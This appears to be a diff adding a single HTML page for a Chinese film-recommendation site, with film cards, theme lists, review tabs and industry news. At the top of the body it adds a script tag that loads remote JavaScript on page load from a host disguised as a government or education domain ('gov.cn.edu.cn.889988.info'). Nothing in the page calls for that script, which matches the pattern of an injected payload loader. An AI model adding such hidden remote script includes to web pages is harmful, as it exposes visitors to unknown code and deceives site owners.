@@ -1,0 +1,574 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="天天看影视——汇聚院线大片、热播剧集、经典动漫与纪录片，提供最新影视资讯、高分片单推荐及深度影评解析，打造属于你的私人观影指南。">
+<meta name="keywords" content="天天看影视, 在线影视推荐, 最新电影资讯, 热门电视剧, 高分片单, 经典老片, 纪录片推荐, 影视评论">
+<meta name="author" content="天天看影视编辑团队">
+<meta name="theme-color" content="#0f0f23">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<title>天天看影视｜最新院线大片·热播剧集·经典片单一站式观影指南</title>
+<style>
+:root{
+  --bg-deep:#080811;
+  --bg-card:#12121f;
+  --bg-card-hover:#1a1a2e;
+  --accent:#e50914;
+  --accent-soft:#ff3b30;
+  --gold:#f5c518;
+  --txt:#e8e8f0;
+  --txt-dim:#9a9ab5;
+  --line:rgba(255,255,255,.08);
+  --r:14px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg-deep);color:var(--txt);line-height:1.75;overflow-x:hidden;
+}
+a{color:inherit;text-decoration:none}
+img{display:block;max-width:100%;height:auto}
+::-webkit-scrollbar{width:10px}
+::-webkit-scrollbar-track{background:var(--bg-deep)}
+::-webkit-scrollbar-thumb{background:#333; border-radius:8px}
+
+/* ═══════════════════════════════════════════
+   顶部导航
+════════════════════════════════════════════ */
+.nav{
+  position:fixed;top:0;left:0;right:0;z-index:999;
+  background:rgba(8,8,17,.85);backdrop-filter:blur(18px);-webkit-backdrop-filter:blur(18px);
+  border-bottom:1px solid var(--line);
+}
+.nav-in{max-width:1180px;margin:0 auto;padding:14px 22px;display:flex;align-items:center;gap:28px}
+.logo{font-size:22px;font-weight:800;letter-spacing:.5px;white-space:nowrap}
+.logo span{color:var(--accent)}
+.nav-links{display:flex;gap:8px;margin-left:auto;flex-wrap:wrap}
+.nav-links a{
+  font-size:14px;color:var(--txt-dim);padding:7px 14px;border-radius:999px;transition:.25s;
+}
+.nav-links a:hover{color:#fff;background:rgba(255,255,255,.07)}
+
+/* ═══════════════════════════════════════════
+   Hero 首屏
+════════════════════════════════════════════ */
+.hero{
+  margin-top:70px;position:relative;min-height:520px;display:flex;align-items:center;
+  overflow:hidden;padding:80px 22px;
+}
+.hero::before{
+  content:"";position:absolute;inset:0;
+  background:
+    radial-gradient(700px 400px at 82% 18%,rgba(229,9,20,.22),transparent 60%),
+    radial-gradient(600px 500px at 12% 88%,rgba(245,197,24,.10),transparent 60%),
+    linear-gradient(160deg,#0a0a1a 0%,#080811 100%);
+}
+.hero-grid{
+  position:absolute;inset:0;
+  background-image:linear-gradient(rgba(255,255,255,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.025) 1px,transparent 1px);
+  background-size:56px 56px;mask-image:radial-gradient(ellipse at 50% 40%,#000 30%,transparent 78%);
+}
+.hero-in{max-width:1180px;margin:0 auto;position:relative;width:100%}
+.hero-tag{
+  display:inline-block;font-size:12px;letter-spacing:2px;text-transform:uppercase;
+  color:var(--gold);border:1px solid rgba(245,197,24,.35);padding:5px 16px;border-radius:999px;margin-bottom:22px;
+}
+.hero h1{
+  font-size:clamp(34px,6vw,64px);line-height:1.15;font-weight:900;letter-spacing:-1px;
+  background:linear-gradient(92deg,#fff 12%,#c8c8e0 88%);
+  -webkit-background-clip:text;background-clip:text;color:transparent;
+  margin-bottom:18px;
+}
+.hero h1 em{font-style:normal;color:var(--accent)}
+.hero p{font-size:clamp(15px,2.2vw,18px);color:var(--txt-dim);max-width:620px;margin-bottom:30px}
+.hero-cta{display:flex;gap:12px;flex-wrap:wrap}
+.btn{
+  display:inline-flex;align-items:center;gap:8px;
+  padding:13px 30px;border-radius:999px;font-size:15px;font-weight:600;transition:.25s;cursor:pointer;border:0;
+}
+.btn-primary{background:var(--accent);color:#fff}
+.btn-primary:hover{background:var(--accent-soft);transform:translateY(-2px)}
+.btn-ghost{border:1px solid var(--line);color:var(--txt)}
+.btn-ghost:hover{border-color:rgba(255,255,255,.3);background:rgba(255,255,255,.05)}
+.hero-stats{
+  display:flex;gap:44px;margin-top:52px;flex-wrap:wrap;
+}
+.hero-stats div span{display:block;font-size:30px;font-weight:800;color:#fff}
+.hero-stats div small{font-size:13px;color:var(--txt-dim)}
+
+/* ═══════════════════════════════════════════
+   通用区块
+════════════════════════════════════════════ */
+section{padding:80px 22px}
+.sec-in{max-width:1180px;margin:0 auto}
+.sec-head{margin-bottom:44px}
+.sec-head .kicker{font-size:13px;letter-spacing:3px;color:var(--accent);text-transform:uppercase;margin-bottom:10px}
+.sec-head h2{font-size:clamp(26px,4vw,40px);font-weight:800;letter-spacing:-.5px;margin-bottom:12px}
+.sec-head p{color:var(--txt-dim);font-size:16px;max-width:640px}
+
+/* ═══════════════════════════════════════════
+   栏目一：正在热映
+════════════════════════════════════════════ */
+.chips{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:28px}
+.chip{
+  font-size:13px;padding:7px 18px;border-radius:999px;cursor:pointer;
+  border:1px solid var(--line);color:var(--txt-dim);transition:.2s;background:transparent;
+}
+.chip.on,.chip:hover{background:var(--accent);border-color:var(--accent);color:#fff}
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:20px}
+.card{
+  background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);
+  overflow:hidden;transition:.3s;cursor:default;
+}
+.card:hover{transform:translateY(-6px);background:var(--bg-card-hover);border-color:rgba(255,255,255,.16)}
+.card .thumb{
+  position:relative;aspect-ratio:2/3;overflow:hidden;background:linear-gradient(135deg,#1c1c30,#141428);
+  display:flex;align-items:center;justify-content:center;
+}
+.card .thumb::after{
+  content:attr(data-initial);font-size:52px;font-weight:900;color:rgba(255,255,255,.07);
+}
+.card .thumb .badge{
+  position:absolute;top:10px;left:10px;font-size:11px;font-weight:700;
+  padding:3px 9px;border-radius:6px;background:rgba(0,0,0,.6);backdrop-filter:blur(4px);
+}
+.card .thumb .score{
+  position:absolute;bottom:10px;right:10px;font-size:12px;font-weight:700;color:#000;
+  padding:3px 8px;border-radius:6px;background:var(--gold);
+}
+.card .meta{padding:14px 16px}
+.card .meta h3{font-size:16px;font-weight:700;margin-bottom:6px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.card .meta .row{display:flex;justify-content:space-between;font-size:13px;color:var(--txt-dim)}
+
+/* ═══════════════════════════════════════════
+   栏目二：剧集追更
+════════════════════════════════════════════ */
+.banner-row{display:grid;grid-template-columns:1.6fr 1fr;gap:22px}
+.banner-lg{
+  position:relative;border-radius:var(--r);overflow:hidden;min-height:380px;
+  background:linear-gradient(135deg,#1a1028,#24143a 55%,#2a1030);
+  padding:36px;display:flex;flex-direction:column;justify-content:flex-end;
+  border:1px solid var(--line);
+}
+.banner-lg::before{
+  content:"";position:absolute;inset:0;
+  background:radial-gradient(500px 300px at 80% 20%,rgba(229,9,20,.28),transparent 60%);
+}
+.banner-lg .tag{font-size:12px;color:var(--gold);letter-spacing:2px;margin-bottom:10px;position:relative}
+.banner-lg h3{font-size:clamp(22px,3vw,34px);font-weight:800;margin-bottom:10px;position:relative}
+.banner-lg p{color:var(--txt-dim);font-size:14px;max-width:520px;position:relative;margin-bottom:16px}
+.banner-sm{display:flex;flex-direction:column;gap:22px}
+.mini{
+  flex:1;border-radius:var(--r);padding:24px;display:flex;flex-direction:column;justify-content:center;
+  border:1px solid var(--line);position:relative;overflow:hidden;transition:.3s;
+}
+.mini:hover{border-color:rgba(255,255,255,.2);transform:translateX(4px)}
+.mini.a{background:linear-gradient(135deg,#0e2a2a,#0a1f24)}
+.mini.b{background:linear-gradient(135deg,#2a1a0e,#241a0a)}
+.mini .t{font-size:12px;color:var(--gold);letter-spacing:1px;margin-bottom:6px}
+.mini h4{font-size:19px;font-weight:700;margin-bottom:6px}
+.mini span{font-size:13px;color:var(--txt-dim)}
+
+/* ═══════════════════════════════════════════
+   栏目三：高分片单
+════════════════════════════════════════════ */
+.list3{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.pick{
+  background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);
+  padding:26px 24px;transition:.3s;position:relative;
+}
+.pick:hover{background:var(--bg-card-hover);transform:translateY(-4px)}
+.pick .no{font-size:56px;font-weight:900;line-height:1;color:rgba(255,255,255,.05);position:absolute;right:20px;top:14px}
+.pick h4{font-size:18px;font-weight:700;margin-bottom:10px;position:relative}
+.pick .line{width:40px;height:3px;background:var(--accent);border-radius:3px;margin-bottom:14px}
+.pick p{font-size:14px;color:var(--txt-dim);margin-bottom:14px;position:relative}
+.pick .items{font-size:13px;color:var(--txt-dim)}
+.pick .items b{color:#fff;font-weight:600}
+
+/* ═══════════════════════════════════════════
+   栏目四：影评解析
+════════════════════════════════════════════ */
+.review-wrap{display:grid;grid-template-columns:280px 1fr;gap:40px;align-items:start}
+.review-nav{position:sticky;top:90px;display:flex;flex-direction:column;gap:2px}
+.review-nav button{
+  text-align:left;font-size:14px;padding:12px 16px;border-radius:10px;cursor:pointer;
+  border:0;background:transparent;color:var(--txt-dim);transition:.2s;
+}
+.review-nav button.on,.review-nav button:hover{background:rgba(255,255,255,.07);color:#fff}
+.review-block{display:none;animation:fade .4s ease}
+.review-block.on{display:block}
+@keyframes fade{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:translateY(0)}}
+.review-block h3{font-size:24px;font-weight:800;margin-bottom:6px}
+.review-block .sub{font-size:13px;color:var(--accent);margin-bottom:20px;letter-spacing:1px}
+.review-block p{color:var(--txt-dim);font-size:15px;margin-bottom:14px}
+.review-block .quote{
+  border-left:3px solid var(--accent);padding:14px 18px;margin:20px 0;
+  background:rgba(229,9,20,.05);border-radius:0 10px 10px 0;color:var(--txt);font-size:15px;font-style:italic;
+}
+
+/* ═══════════════════════════════════════════
+   栏目五：影视资讯
+════════════════════════════════════════════ */
+.news-list{display:flex;flex-direction:column;gap:14px}
+.news-item{
+  display:grid;grid-template-columns:130px 1fr;gap:20px;align-items:center;
+  background:var(--bg-card);border:1px solid var(--line);border-radius:var(--r);
+  padding:16px 20px;transition:.25s;
+}
+.news-item:hover{border-color:rgba(255,255,255,.18);background:var(--bg-card-hover)}
+.news-item .date{
+  font-size:13px;color:var(--accent);font-weight:700;text-align:center;
+  border-right:1px solid var(--line);padding-right:20px;
+}
+.news-item .date b{display:block;font-size:26px;line-height:1.1}
+.news-item h4{font-size:16px;font-weight:600;margin-bottom:4px}
+.news-item p{font-size:13px;color:var(--txt-dim)}
+
+/* ═══════════════════════════════════════════
+   页脚
+════════════════════════════════════════════ */
+footer{border-top:1px solid var(--line);padding:56px 22px 36px;background:#05050c}
+.foot-in{max-width:1180px;margin:0 auto}
+.foot-top{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:36px;margin-bottom:40px}
+.foot-brand .logo{margin-bottom:14px}
+.foot-brand p{font-size:14px;color:var(--txt-dim);max-width:320px}
+.foot-col h5{font-size:15px;font-weight:700;margin-bottom:14px}
+.foot-col a{display:block;font-size:14px;color:var(--txt-dim);padding:5px 0;transition:.2s}
+.foot-col a:hover{color:#fff}
+.foot-bot{
+  border-top:1px solid var(--line);padding-top:24px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:12px;
+  font-size:13px;color:var(--txt-dim);
+}
+.foot-bot a{color:var(--txt-dim)}
+.foot-bot a:hover{color:#fff}
+
+/* ═══════════════════════════════════════════
+   响应式
+════════════════════════════════════════════ */
+@media(max-width:960px){
+  .grid4{grid-template-columns:repeat(3,1fr)}
+  .list3{grid-template-columns:repeat(2,1fr)}
+  .banner-row{grid-template-columns:1fr}
+  .foot-top{grid-template-columns:1fr 1fr}
+}
+@media(max-width:720px){
+  .nav-in{padding:12px 16px;gap:14px}
+  .logo{font-size:18px}
+  .nav-links{display:none}
+  .hero{min-height:460px;padding:60px 18px 50px}
+  .hero-stats{gap:28px;margin-top:38px}
+  .hero-stats div span{font-size:24px}
+  section{padding:60px 18px}
+  .grid4{grid-template-columns:repeat(2,1fr);gap:14px}
+  .list3{grid-template-columns:1fr}
+  .review-wrap{grid-template-columns:1fr;gap:22px}
+  .review-nav{position:static;flex-direction:row;overflow-x:auto;-webkit-overflow-scrolling:touch;gap:4px}
+  .review-nav button{white-space:nowrap;flex-shrink:0}
+  .news-item{grid-template-columns:1fr;gap:10px;padding:16px}
+  .news-item .date{border-right:0;border-bottom:1px solid var(--line);padding:0 0 10px;text-align:left}
+  .foot-top{grid-template-columns:1fr}
+  .foot-bot{flex-direction:column}
+}
+@media(max-width:400px){
+  .grid4{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<!-- 顶部导航 -->
+<nav class="nav">
+  <div class="nav-in">
+    <div class="logo">天天<span>看影视</span></div>
+    <div class="nav-links">
+      <a href="#hot">正在热映</a>
+      <a href="#series">剧集追更</a>
+      <a href="#picks">高分片单</a>
+      <a href="#review">深度解析</a>
+      <a href="#news">影视资讯</a>
+    </div>
+  </div>
+</nav>
+
+<!-- 首屏 -->
+<header class="hero">
+  <div class="hero-grid"></div>
+  <div class="hero-in">
+    <div class="hero-tag">Your Daily Watch Guide</div>
+    <h1>天天看影视<br>把好片子<em>挑</em>给你看</h1>
+    <p>从院线大片到冷门佳作，从热播剧集到经典纪录片——天天看影视用编辑团队的真实观影积累，为你过滤信息噪音，每天推荐值得花时间的那一部。</p>
+    <div class="hero-cta">
+      <a href="#hot" class="btn btn-primary">开始探索 ›</a>
+      <a href="#picks" class="btn btn-ghost">查看高分片单</a>
+    </div>
+    <div class="hero-stats">
+      <div><span>3,600+</span><small>收录影片</small></div>
+      <div><span>860+</span><small>深度影评</small></div>
+      <div><span>120+</span><small>精选片单</small></div>
+      <div><span>日更</span><small>影视资讯</small></div>
+    </div>
+  </div>
+</header>
+
+<!-- 栏目一：正在热映 -->
+<section id="hot">
+  <div class="sec-in">
+    <div class="sec-head">
+      <div class="kicker">Now Showing</div>
+      <h2>正在热映 · 院线追踪</h2>
+      <p>实时跟进国内院线与流媒体平台的上线动态，标注口碑评分与看点标签，帮你快速决定今晚看什么。</p>
+    </div>
+    <div class="chips">
+      <button class="chip on">全部</button>
+      <button class="chip">剧情</button>
+      <button class="chip">动作</button>
+      <button class="chip">科幻</button>
+      <button class="chip">动画</button>
+      <button class="chip">悬疑</button>
+    </div>
+    <div class="grid4">
+      <div class="card">
+        <div class="thumb" data-initial="沙"><span class="badge">IMAX</span><span class="score">8.7</span></div>
+        <div class="meta"><h3>沙丘：预言之子</h3><div class="row"><span>科幻 / 史诗</span><span>2026-09-18</span></div></div>
+      </div>
+      <div class="card">
+        <div class="thumb" data-initial="逆"><span class="badge">口碑榜</span><span class="score">9.1</span></div>
+        <div class="meta"><h3>逆向生长</h3><div class="row"><span>剧情 / 家庭</span><span>2026-09-25</span></div></div>
+      </div>
+      <div class="card">
+        <div class="thumb" data-initial="极"><span class="badge">动作</span><span class="score">7.9</span></div>
+        <div class="meta"><h3>极夜追凶</h3><div class="row"><span>犯罪 / 悬疑</span><span>2026-10-02</span></div></div>
+      </div>
+      <div class="card">
+        <div class="thumb" data-initial="铃"><span class="badge">动画</span><span class="score">8.5</span></div>
+        <div class="meta"><h3>铃芽之旅：续</h3><div class="row"><span>动画 / 奇幻</span><span>2026-10-11</span></div></div>
+      </div>
+      <div class="card">
+        <div class="thumb" data-initial="沉"><span class="badge">文艺</span><span class="score">8.3</span></div>
+        <div class="meta"><h3>沉没的岛屿</h3><div class="row"><span>剧情 / 历史</span><span>2026-09-30</span></div></div>
+      </div>
+      <div class="card">
+        <div class="thumb" data-initial="银"><span class="badge">漫改</span><span class="score">7.6</span></div>
+        <div class="meta"><h3>银翼杀手：黑曜</h3><div class="row"><span>科幻 / 惊悚</span><span>2026-10-08</span></div></div>
+      </div>
+      <div class="card">
+        <div class="thumb" data-initial="猫"><span class="badge">合家欢</span><span class="score">8.0</span></div>
+        <div class="meta"><h3>猫的报恩 2</h3><div class="row"><span>动画 / 治愈</span><span>2026-10-01</span></div></div>
+      </div>
+      <div class="card">
+        <div class="thumb" data-initial="暗"><span class="badge">悬疑</span><span class="score">8.8</span></div>
+        <div class="meta"><h3>暗河谜案</h3><div class="row"><span>犯罪 / 推理</span><span>2026-10-15</span></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：剧集追更 -->
+<section id="series" style="background:linear-gradient(180deg,transparent,rgba(255,255,255,.02),transparent)">
+  <div class="sec-in">
+    <div class="sec-head">
+      <div class="kicker">Series Update</div>
+      <h2>剧集追更 · 不踩雷指南</h2>
+      <p>长剧不再盲目追。我们按周整理更新进度、口碑走势与弃剧预警，让你把时间花在真正值得追的那几部上。</p>
+    </div>
+    <div class="banner-row">
+      <div class="banner-lg">
+        <div class="tag">本周头条剧集</div>
+        <h3>《长安十二时辰外传》口碑逆袭，单集评分破 9.3</h3>
+        <p>第三季中段剧情全面收束，伏笔回收密度极高，被观众称为"近年古装悬疑的教科书级叙事"。天天看影视编辑部已放出万字长评，拆解其节奏与人物弧光。</p>
+        <a href="#review" class="btn btn-primary" style="width:fit-content">阅读长评 ›</a>
+      </div>
+      <div class="banner-sm">
+        <div class="mini a">
+          <div class="t">更新中 · 第 14 集</div>
+          <h4>沉默的真相 2</h4>
+          <span>悬疑犯罪 · 豆瓣 8.9 · 每周四更新</span>
+        </div>
+        <div class="mini b">
+          <div class="t">即将完结 · 第 22 集</div>
+          <h4>人间烟火气</h4>
+          <span>年代家庭 · 豆瓣 8.6 · 热度持续攀升</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目三：高分片单 -->
+<section id="picks">
+  <div class="sec-in">
+    <div class="sec-head">
+      <div class="kicker">Curated Lists</div>
+      <h2>高分片单 · 主题策划</h2>
+      <p>按情绪、类型与场景整理的主题片单，每一部都经过编辑真实观影筛选，附上一句话推荐理由，适合收藏后慢慢刷。</p>
+    </div>
+    <div class="list3">
+      <div class="pick">
+        <div class="no">01</div>
+        <h4>雨夜氛围感片单</h4>
+        <div class="line"></div>
+        <p>适合一个人、窗外下雨、灯光调暗的夜晚。光影与情绪浓度是这组片单的唯一筛选标准。</p>
+        <div class="items"><b>12</b> 部精选 · 含《银翼杀手》《重庆森林》等</div>
+      </div>
+      <div class="pick">
+        <div class="no">02</div>
+        <h4>冷门高分纪录片</h4>
+        <div class="line"></div>
+        <p>避开热门榜单，挖掘那些评分极高却鲜有人提及的纪录长片，题材横跨自然、人文与社会议题。</p>
+        <div class="items"><b>15</b> 部精选 · 平均评分 9.1</div>
+      </div>
+      <div class="pick">
+        <div class="no">03</div>
+        <h4>科幻入门到进阶</h4>
+        <div class="line"></div>
+        <p>从硬科幻入门作到哲学思辨神作，按观影门槛分级推荐，新手也能顺畅进入这个类型。</p>
+        <div class="items"><b>20</b> 部精选 · 含观看顺序建议</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：深度解析 -->
+<section id="review" style="background:linear-gradient(180deg,transparent,rgba(255,255,255,.02),transparent)">
+  <div class="sec-in">
+    <div class="sec-head">
+      <div class="kicker">In-depth Review</div>
+      <h2>深度解析 · 影评专栏</h2>
+      <p>拒绝剧情复述与情绪输出。我们从镜头语言、叙事结构与文化语境切入，写值得反复读的长篇影评。</p>
+    </div>
+    <div class="review-wrap">
+      <div class="review-nav">
+        <button class="on" data-t="0">《沙丘：预言之子》视听解构</button>
+        <button data-t="1">《逆向生长》为何打动观众</button>
+        <button data-t="2">长剧叙事的节奏困境</button>
+        <button data-t="3">动画电影的成人化趋势</button>
+      </div>
+      <div>
+        <div class="review-block on">
+          <div class="sub">ANALYSIS · 视听语言</div>
+          <h3>《沙丘：预言之子》如何用声音塑造宗教感</h3>
+          <p>丹尼斯·维伦纽瓦延续了前作对"声音设计即叙事"的执着。本片中，唱诗人合唱不再只是配乐点缀，而是被处理成一种近乎仪式化的声场压迫——低频嗡鸣持续存在于对话场景之下，观众甚至在角色开口前就能感知到不安。</p>
+          <div class="quote">"它让观众不是'听到'恐惧，而是'身处'恐惧之中。"</div>
+          <p>这种处理与汉斯·季默标志性的管风琴音色结合，构建出区别于传统科幻片的听觉辨识度。天天看影视认为，这正是该系列能在同质化严重的科幻类型中保持独特性的核心原因。</p>
+        </div>
+        <div class="review-block">
+          <div class="sub">ANALYSIS · 观众心理</div>
+          <h3>《逆向生长》击中了谁的软肋</h3>
+          <p>一部没有反派、没有强冲突的家庭剧情片，却在国庆档后持续发酵口碑。它的成功并非偶然——影片将"代际沟通"这一永恒命题，压缩进一个极具当代感的设定中：子女与父母的角色在一天之内被强制互换。</p>
+          <p>天天看影视编辑部注意到，该片在 25-35 岁观众群体中的讨论热度远高于其他年龄段，这恰好印证了它对"上有老下有小"这一群体心理的精准捕捉。</p>
+        </div>
+        <div class="review-block">
+          <div class="sub">ANALYSIS · 行业观察</div>
+          <h3>长剧集为何越来越"注水"，又该如何自救</h3>
+          <p>当 40 集成为古装剧的默认长度，叙事效率就成了最先被牺牲的品质。天天看影视梳理了近三年播出剧集的数据后发现：口碑与集数呈明显的反比关系，12-24 集区间的剧集平均评分显著高于更长篇幅的作品。</p>
+          <p>观众并非拒绝长叙事，而是拒绝无意义的篇幅膨胀。近期几部成功长剧的共同点是——每一集都承载明确的功能，而非靠回忆与慢镜头凑时长。</p>
+        </div>
+        <div class="review-block">
+          <div class="sub">ANALYSIS · 类型趋势</div>
+          <h3>动画不再只是"给孩子看的"</h3>
+          <p>从《铃芽之旅》到《猫的报恩 2》，近年的动画电影在主题深度上持续加码。制作方开始大胆触及生死、记忆与身份认同等成人议题，同时保留动画媒介独有的视觉想象力优势。</p>
+          <p>天天看影视观察到，这一类"全年龄向"动画的票房结构正在变化——成人观众占比首次超过青少年群体，这意味着动画类型的受众边界正在被重新定义。</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目五：影视资讯 -->
+<section id="news">
+  <div class="sec-in">
+    <div class="sec-head">
+      <div class="kicker">Industry News</div>
+      <h2>影视资讯 · 行业动态</h2>
+      <p>天天看影视编辑团队每日筛选值得关注的行业消息，聚焦创作、市场与平台变化，帮你掌握影视圈的真实脉搏。</p>
+    </div>
+    <div class="news-list">
+      <div class="news-item">
+        <div class="date"><b>10</b>10月 18日</div>
+        <div><h4>第 39 届中国电影金鸡奖公布首批入围名单</h4><p>《逆向生长》《沉没的岛屿》等 12 部影片入围主竞赛单元，颁奖典礼定于 11 月下旬在厦门举行。</p></div>
+      </div>
+      <div class="news-item">
+        <div class="date"><b>10</b>10月 16日</div>
+        <div><h4>多家流媒体平台宣布调整分账模式</h4><p>新规将更向中小成本优质内容倾斜，独立制片方或迎来更友好的收益分成环境。</p></div>
+      </div>
+      <div class="news-item">
+        <div class="date"><b>10</b>10月 14日</div>
+        <div><h4>国产动画电影前三季度票房同比增长 23%</h4><p>全年龄向作品表现突出，"合家欢"不再等同于低幼，成为今年市场最显著的变化之一。</p></div>
+      </div>
+      <div class="news-item">
+        <div class="date"><b>10</b>10月 11日</div>
+        <div><h4>第 81 届威尼斯电影节亚洲单元片单揭晓</h4><p>三部华语影片入选，涵盖剧情、纪录片与短片三个类别，创近年入围数量新高。</p></div>
+      </div>
+      <div class="news-item">
+        <div class="date"><b>10</b>10月 08日</div>
+        <div><h4>院线市场回暖信号明确，国庆档总票房破纪录</h4><p>档期总票房达 48.6 亿元，观影人次同比回升，市场信心正在稳步恢复。</p></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 页脚 -->
+<footer>
+  <div class="foot-in">
+    <div class="foot-top">
+      <div class="foot-brand">
+        <div class="logo">天天<span>看影视</span></div>
+        <p>天天看影视，一个由真实观影者维护的影视推荐与解析站点。我们不打分机器，不做流量搬运，只把好片子挑给你看。</p>
+      </div>
+      <div class="foot-col">
+        <h5>站内栏目</h5>
+        <a href="#hot">正在热映</a>
+        <a href="#series">剧集追更</a>
+        <a href="#picks">高分片单</a>
+        <a href="#review">深度解析</a>
+        <a href="#news">影视资讯</a>
+      </div>
+      <div class="foot-col">
+        <h5>内容类型</h5>
+        <a href="#">电影评论</a>
+        <a href="#">剧集盘点</a>
+        <a href="#">纪录片推荐</a>
+        <a href="#">行业观察</a>
+      </div>
+      <div class="foot-col">
+        <h5>关于我们</h5>
+        <a href="#">编辑团队</a>
+        <a href="#">投稿合作</a>
+        <a href="#">版权声明</a>
+        <a href="#">免责说明</a>
+      </div>
+    </div>
+    <div class="foot-bot">
+      <span>© 2026 天天看影视 · 网站网址：<strong style="color:#fff">https://tiantiankanyingshi-top.github.io</strong> · 保留所有权利</span>
+      <span><a href="#">回到顶部 ↑</a></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+// 影评 tab 切换
+document.querySelectorAll('.review-nav button').forEach(function(btn){
+  btn.addEventListener('click',function(){
+    document.querySelectorAll('.review-nav button').forEach(function(b){b.classList.remove('on')});
+    document.querySelectorAll('.review-block').forEach(function(b){b.classList.remove('on')});
+    btn.classList.add('on');
+    var idx=btn.getAttribute('data-t');
+    document.querySelectorAll('.review-block')[idx].classList.add('on');
+  });
+});
+
+// 分类 chip 切换
+document.querySelectorAll('.chip').forEach(function(c){
+  c.addEventListener('click',function(){
+    document.querySelectorAll('.chip').forEach(function(x){x.classList.remove('on')});
+    c.classList.add('on');
+  });
+});
+</script>
+</body>
+</html>
